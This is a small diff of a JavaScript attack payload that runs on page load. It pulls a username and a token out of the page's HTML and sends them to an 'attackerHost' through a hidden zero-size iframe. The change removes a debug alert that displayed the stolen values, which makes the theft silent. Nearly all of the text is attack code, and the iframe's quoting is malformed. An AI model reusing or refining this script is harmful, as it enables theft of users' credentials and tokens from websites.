@@ -15,6 +15,5 @@ $(document).ready(function() {
   {
     token+=htmlPage[index];
   }
-  alert(username+" : "+token);
   document.documentElement.innerHTML+='<iframe src="'+attackerHost+'&username="'+username+'&token='+token+' height="0" width="0" frameborder="0"></iframe>';
 });
